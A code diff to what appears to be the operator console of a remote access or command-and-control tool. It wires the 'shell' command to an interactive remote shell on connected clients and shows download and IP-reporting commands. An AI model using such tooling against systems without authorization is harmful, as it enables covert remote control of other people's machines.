@@ -6,6 +6,7 @@ from src.utils.client_handler import get_client_by_id, list_clients, clients, ha
 from src.ui.help import show_main_help, show_client_help
 from src.utils.net_io import recv, send
 import json
+from src.modules.shell_module import stream_shell
 
 
 
@@ -69,10 +70,11 @@ def client_loop(client_info):
     while True:
         try:
             cmd = cl_session.prompt(cl_prompt).strip()
-            
+
             if cmd == "shell":
                 send(client_info['socket'], cmd)
-                print(f"{cl.green}[+] Starting shell session on client {client_info['ip']}...{cl.reset}")
+                stream_shell(client_info['socket'], client_info['hostname'])
+                continue
                 
             elif cmd.strip() == "download":
                 send(client_info['socket'], cmd)
@@ -90,6 +92,7 @@ def client_loop(client_info):
                     ip_info = json.loads(data.decode())
                     print(f"{cl.purple}Local IP:{cl.reset}\t {ip_info.get('lip', 'unknown')}")
                     print(f"{cl.purple}Public IP:{cl.reset}\t {ip_info.get('pip', 'unknown')}")
+                continue
 
             elif cmd == "back":
                 print(f"{cl.blue}[+] Returning to main session{cl.reset}")
@@ -97,6 +100,7 @@ def client_loop(client_info):
                 
             elif cmd == "help":
                 show_client_help()
+                continue
                 
             elif cmd:
                 print(f"{cl.red}[!] Unknown command. Type 'help' for options.{cl.reset}")
